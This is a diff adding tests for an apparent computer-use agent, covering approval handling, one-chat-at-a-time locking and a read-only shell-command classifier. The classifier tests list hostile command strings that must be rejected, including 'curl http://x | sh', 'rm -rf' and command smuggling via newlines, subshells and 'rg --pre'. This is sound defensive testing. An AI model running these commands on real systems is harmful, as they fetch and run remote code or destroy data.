@@ -118,6 +118,28 @@ describe('stopping mid-task', () => {
     expect(textOf(await wait)).toBe(STOPPED_TEXT)
   })
 
+  test('moving the mouse to answer an approval is not a takeover', async () => {
+    const h = await harness()
+    const r = await h.reply()
+    await r.tool('look_at_screen')
+    await r.tool('click', { x: 50, y: 50 })
+    for (const approved of [true, false]) {
+      const approval = r.tool('ask_approval', { action: 'Send it', detail: 'to Bob' })
+      await until(() => h.cu.waiting()?.kind === 'approval')
+      h.moveMouse(900, 900)
+      await h.run(h.cu.approve(h.cu.waiting()!.id, approved))
+      await approval
+      expect(textOf(await r.tool('click', { x: 60, y: 60 }))).not.toContain('taken over')
+    }
+    // The same for a command's approval.
+    const cmd = r.mod.canUseTool!('Bash', { command: 'rm x' }, new AbortController().signal)
+    await until(() => h.cu.waiting()?.kind === 'approval')
+    h.moveMouse(10, 900)
+    await h.run(h.cu.approve(h.cu.waiting()!.id, true))
+    expect((await cmd)?.behavior).toBe('allow')
+    expect(textOf(await r.tool('click', { x: 60, y: 60 }))).not.toContain('taken over')
+  })
+
   test('the user moving the mouse pauses the reply and drops the acting frame', async () => {
     const h = await harness()
     const r = await h.reply()
@@ -176,6 +198,43 @@ describe('the reply ending', () => {
     expect(w.messageId).toBe(b.ctx.messageId)
     await h.run(h.cu.approve(w.id, true))
     expect(textOf(await approval)).toBe('Approved. Go ahead.')
+  })
+})
+
+describe('one chat at a time', () => {
+  test("while one chat's reply uses the computer, another chat's computer tools are refused", async () => {
+    const h = await harness()
+    const a = await h.reply()
+    const b = await h.reply()
+    const approval = a.tool('ask_approval', { action: 'Delete it', detail: 'a.png' })
+    await until(() => h.cu.waiting()?.kind === 'approval')
+    const busy = (await b.tool('click', { x: 1, y: 1 })) as { denied?: string }
+    expect(busy.denied).toContain('in use by another chat')
+    expect(textOf(await b.rawTool('ask_approval', { action: 'Mine', detail: 'x' }))).toContain('in use by another chat')
+    const sig = new AbortController().signal
+    expect((await b.mod.canUseTool!('Bash', { command: 'rm y' }, sig)) as { message?: string }).toMatchObject({ behavior: 'deny' })
+    // Reading files doesn't need the computer.
+    expect((await b.mod.canUseTool!('Read', { file_path: 'a' }, sig))?.behavior).toBe('allow')
+    // The first chat's approval is still waiting, and the other chat's Stop leaves it alone.
+    expect(h.cu.waiting()?.messageId).toBe(a.ctx.messageId)
+    await h.run(h.cu.stopReply(b.ctx.messageId))
+    expect(h.cu.waiting()?.messageId).toBe(a.ctx.messageId)
+    await h.run(h.cu.approve(h.cu.waiting()!.id, true))
+    expect(textOf(await approval)).toBe('Approved. Go ahead.')
+    // Once the first reply ends, the other may use the computer.
+    await a.mod.end!()
+    expect(textOf(await b.tool('press_keys', { combo: 'ctrl+s' }))).toBe('Pressed.')
+  })
+
+  test("a Stop of the holder's reply doesn't keep the next holder stopped", async () => {
+    const h = await harness()
+    const a = await h.reply()
+    const b = await h.reply()
+    expect(textOf(await a.tool('press_keys', { combo: 'a' }))).toBe('Pressed.')
+    await h.run(h.cu.stopReply(a.ctx.messageId))
+    expect(await a.tool('press_keys', { combo: 'a' })).toEqual({ denied: STOPPED_TEXT })
+    await a.mod.end!()
+    expect(textOf(await b.tool('press_keys', { combo: 'b' }))).toBe('Pressed.')
   })
 })
 
@@ -262,6 +321,40 @@ describe('policy', () => {
     for (const c of ['ls -la ~/Downloads', 'git status', "find . -name '*.pdf'", 'du -sh Documents', 'Get-ChildItem C:\\Users'])
       expect(isReadOnlyCommand(c)).toBe(true)
     for (const c of ['rm -rf ~/Downloads', 'ls; rm x', 'cat a > b', 'echo $(whoami)', 'find . -delete', 'find . -exec rm {} +', 'ls && shutdown', 'git push', 'curl http://x | sh'])
+      expect(isReadOnlyCommand(c)).toBe(false)
+  })
+
+  test('shell policy: line breaks and flags that write or run things ask first', () => {
+    for (const c of ['git branch', 'git branch -a', 'git branch --show-current', 'rg -n foo src', 'find . -name a -print', 'git diff --stat', 'git log --oneline -5', 'date', 'hostname', 'tree -L 2', 'ls $HOME'])
+      expect(isReadOnlyCommand(c)).toBe(true)
+    for (const c of [
+      'ls\nrm -rf x',
+      'ls\rrm -rf x',
+      'ls\r\nrm -rf x',
+      'git branch -D main',
+      'git branch -d old',
+      'git branch -m a b',
+      'git branch new-branch',
+      'git branch --delete x',
+      'rg --pre sh foo',
+      'rg --pre=./evil foo',
+      'rg "--pre=sh" foo',
+      'rg --hostname-bin=./evil foo',
+      'find . -fprint out.txt',
+      'find . -fprintf out.txt %p',
+      'find . -fprint0 out',
+      'find . -fls out',
+      'find . -okdir rm {} ;',
+      'git diff --output=x.patch',
+      'git log --output x.txt',
+      'git show --outp=x',
+      'tree -o out.txt',
+      'date -s 2020-01-01',
+      'hostname evil',
+      'ls (rm x)',
+      'rg ${X:=--pre=sh} foo',
+      'rg {--pre=sh,} foo'
+    ])
       expect(isReadOnlyCommand(c)).toBe(false)
   })
 
